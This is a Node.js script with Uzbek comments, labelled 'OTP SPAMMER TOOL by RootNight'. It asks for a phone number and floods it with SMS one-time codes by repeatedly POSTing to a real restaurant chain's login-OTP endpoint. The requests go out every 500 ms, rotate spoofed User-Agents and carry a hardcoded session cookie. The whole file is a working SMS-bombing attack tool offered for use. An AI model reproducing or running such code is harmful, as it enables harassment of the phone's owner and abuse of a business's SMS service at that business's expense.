const axios = require('axios');
const readline = require('readline-sync');
const fs = require('fs');

// ⬇️ Versiyani tekshiradigan funksiya
const LOCAL_VERSION = '1.0.0'; // Mahalliy versiya
const REMOTE_VERSION_URL = 'https://raw.githubusercontent.com/<your-username>/<your-repo>/main/version.txt'; // GitHub dagi version.txt manzili

async function checkVersion() {
  try {
    const response = await axios.get(REMOTE_VERSION_URL);
    const remoteVersion = response.data.trim();

    if (remoteVersion !== LOCAL_VERSION) {
      console.log(`
╔══════════════════════════════════════╗
║ ⚠️ YANGILANISH MAVJUD!                 ║
║ 🔁 Yangi versiya: ${remoteVersion}                     ║
║ 🔒 Iltimos, dasturni yangilang.         ║
╚══════════════════════════════════════╝
      `);
      process.exit(); // Dasturni to‘xtatadi
    }
  } catch (err) {
    console.log('⚠️ Versiyani tekshirib bo‘lmadi:', err.message);
  }
}

// Asosiy ishlarni boshlashdan oldin versiyani tekshirish
checkVersion().then(() => {
  // Chiroyli chizilgan interfeys
  console.log(`
╔══════════════════════════════════════╗
║ 📲 OTP SPAMMER TOOL by RootNight      ║
║ 🌐 Telegram: @rootnightblog           ║
╚══════════════════════════════════════╝
  `);

  // Telefon raqamni va maksimal yuborish sonini so‘raymiz
  const phone = readline.question('📱 Telefon raqamni kiriting (masalan: 88 790 59 99): ');
  const maxCount = parseInt(readline.question('📈 Nechta SMS yuborilishi kerak (maksimal 999): '));

  // Intervalli va hisoblagich
  const intervalTime = 500; // 5 sekundda bir yuboradi
  let count = 0;
  let interval;  // intervalni faqat bir marta e'lon qilamiz

  // Tasodifiy User-Agent yaratish uchun function
  function getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
      'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  // OTP yuborish funksiyasi
  function sendOTP() {
    if (count >= maxCount) {
      clearInterval(interval);  // Maksimal yuborish soniga yetganda intervalni to‘xtatish
      console.log('🔔 Yuborish tugadi.');
      return;
    }

    axios({
      method: 'post',
      url: 'https://kfc.com.uz/post/loginUserOTP',
      data: `type=1&country_id=3978&username=${encodeURIComponent(phone)}`,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://kfc.com.uz',
        'Referer': 'https://kfc.com.uz/',
        'User-Agent': getRandomUserAgent(), // Tasodifiy User-Agent
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Gpc': '1',
        'Priority': 'u=0',
        'Te': 'trailers',
        'Cookie': 'HttpOnly; PHPSESSID=079fe9564589c58d265b9b3789cfeb24; G_ENABLED_IDPS=google; CookieConsent={stamp:%27oKwEuZv1KPYNeiiPS3S7Nc4fXl90KBsTfJrmiZse97LzWmtg4dCwtg==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1747175855095%2Cregion:%27uz%27}'
      },
    }).then((response) => {
      count++;
      console.log(`🔁 ${count}. SMS yuborildi!`);
    }).catch((error) => {
      console.log('❌ Xatolik yuz berdi:', error.message);
    });
  }

  // SMS yuborish jarayonini boshlash
  console.log(`🔁 Kod yuborish boshlandi → ${phone}`);
  interval = setInterval(sendOTP, intervalTime);
});
